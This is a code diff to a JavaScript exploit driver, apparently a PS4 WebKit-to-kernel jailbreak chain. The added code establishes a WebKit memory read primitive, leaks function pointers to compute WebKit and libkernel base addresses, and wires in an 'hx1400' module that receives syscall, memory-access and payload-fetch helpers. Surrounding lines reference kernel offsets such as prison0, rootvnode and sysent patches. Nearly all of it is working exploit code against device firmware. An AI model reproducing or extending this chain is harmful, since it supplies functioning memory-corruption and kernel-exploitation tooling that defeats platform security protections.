@@ -162,6 +162,85 @@ let allDone = false,
     }
     const fwKey = key || "unknown";
 
+    const PRIMITIVE_ONLY = params.get("stop") === "primitive";
+
+    if (PRIMITIVE_ONLY) {
+      state("testing WebKit primitive...", "warn");
+
+      await new Promise(function (resolve) {
+        setTimeout(resolve, 0);
+      });
+
+      const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;
+
+      const carrier = await establishPrimitive({
+        maxAttempts: 6,
+        onEvent: function (tag, detail, attempt) {
+          const writer = PRIMITIVE_LOUD.test(tag) ? mark : trace;
+
+          writer(
+            tag,
+            (attempt != null ? "[" + attempt + "] " : "") +
+              (detail || ""),
+          );
+        },
+      });
+
+      installWindowP(carrier, { promote: false });
+
+      const pp = window.p;
+
+      const cell = pp.leakval(Math.expm1);
+
+      const nativeFn = pp.read8(
+        pp.read8(cell.add32(0x18)).add32(
+          off.wk_JSFunction_m_function,
+        ),
+      );
+
+      const webkitBase = nativeFn.sub32(
+        off.wk_expm1_builtin,
+      );
+
+      const aligned = function (value) {
+        return value.hi > 0 && (value.low & 0x3fff) === 0;
+      };
+
+      const primitiveOk = aligned(webkitBase);
+
+      try {
+        const errorFn = pp.read8(
+          webkitBase.add32(off.wk___imp___error),
+        );
+
+        const libkernelBase = errorFn.sub32(
+          off.k__error,
+        );
+
+        mark(
+          "BASES",
+          "webkit=" + webkitBase +
+          " libkernel=" + libkernelBase,
+        );
+      } catch (baseError) {
+        mark(
+          "BASES",
+          "webkit=" + webkitBase +
+          " libkernel=unresolved",
+        );
+      }
+
+      mark(
+        "PRIMITIVE-ONLY",
+        primitiveOk ? "PASS" : "FAIL",
+      );
+
+      allDone = true;
+      finishUI(primitiveOk);
+      return;
+    }
+
+
     const DO_JB = params.get("jb") !== "0";
     const DO_PATCH = params.get("patch") !== "0";
     const DO_PAYLOAD = params.get("payload") !== "0";
@@ -169,7 +248,8 @@ let allDone = false,
 
     const KEEP_JB = params.get("keepjb") === "1";
 
-    const NEED_K = [
+    const HX1400_MODE = params.get("hx1400") === "1";
+    const NEED_K = HX1400_MODE ? [] : [
       "k_idt_rsvd",
       "k_oid_kern_file",
       "k_oid_maxfilesperproc",
@@ -200,7 +280,7 @@ let allDone = false,
     const KPATCH_FILE =
       "patches/" + (off.kpatch || fwKey.replace(".", "") + ".bin");
     const PAYLOAD_FILE = off.payload || "payload.bin";
-    const needPatch = ["k_sysent_661", "k_jmp_rsi"].filter(
+    const needPatch = HX1400_MODE ? [] : ["k_sysent_661", "k_jmp_rsi"].filter(
       (k) => off[k] === undefined,
     );
     if (
@@ -215,7 +295,7 @@ let allDone = false,
       )
     )
       return;
-    const needPl = ["wk___imp_pthread_create", "k_pthread_create"].filter(
+    const needPl = HX1400_MODE ? [] : ["wk___imp_pthread_create", "k_pthread_create"].filter(
       (k) => off[k] === undefined,
     );
     if (
@@ -229,17 +309,29 @@ let allDone = false,
     mark("FW-STATUS", off.fw_status || "none");
     mark(
       "FW-KTABLE",
-      "idt_rsvd=0x" +
-        off.k_idt_rsvd.toString(16) +
-        " prison0=0x" +
-        off.k_prison0.toString(16) +
-        " rootvnode=0x" +
-        off.k_rootvnode.toString(16) +
-        " kpatch=" +
+      "idt_rsvd=" +
+        (
+          off.k_idt_rsvd === undefined
+            ? "undefined"
+            : "0x" + off.k_idt_rsvd.toString(16)
+        ) +
+      " prison0=" +
+        (
+          off.k_prison0 === undefined
+            ? "undefined"
+            : "0x" + off.k_prison0.toString(16)
+        ) +
+      " rootvnode=" +
+        (
+          off.k_rootvnode === undefined
+            ? "undefined"
+            : "0x" + off.k_rootvnode.toString(16)
+        ) +
+      " kpatch=" +
         KPATCH_FILE +
-        " payload=" +
+      " payload=" +
         PAYLOAD_FILE +
-        " src=ps4_offsets.js",
+      " src=ps4_offsets.js",
     );
 
     // ---- benign-miss auto-retry (reads only, before any kernel write) ----
@@ -598,7 +690,61 @@ let allDone = false,
       );
     }
 
-    const pid = sc(SYS.getpid).i32;
+    
+    if (params.get("hx1400") === "1") {
+      try {
+        const hx = await import("./hx1400_port.js?v=1");
+
+        const hxOk = await hx.runHx1400({
+          p: p,
+          sc: sc,
+          callAddr: callAddr,
+          bufAddr: bufAddr,
+          errno: errno,
+          webkitBase: webkitBase,
+          libkernelBase: libkernelBase,
+          G: G,
+          stubAddr: stubAddr,
+          int64: int64,
+          params: params,
+          keepAlive: keepAlive,
+          mark: mark,
+          trace: trace,
+          state: state,
+          check: check,
+          fetchFile: async function (path) {
+            const response = await fetch(path);
+
+            if (!response.ok) {
+              throw new Error(
+                path + " HTTP " + response.status,
+              );
+            }
+
+            return new Uint8Array(
+              await response.arrayBuffer(),
+            );
+          },
+        });
+
+        allDone = true;
+        finishUI(hxOk === true);
+      } catch (hxError) {
+        mark(
+          "HX1400-THREW",
+          hxError && hxError.message
+            ? hxError.message
+            : String(hxError),
+        );
+
+        allDone = true;
+        finishUI(false);
+      }
+
+      return;
+    }
+
+const pid = sc(SYS.getpid).i32;
     check(
       "chain-reaches-kernel",
       pid > 0,
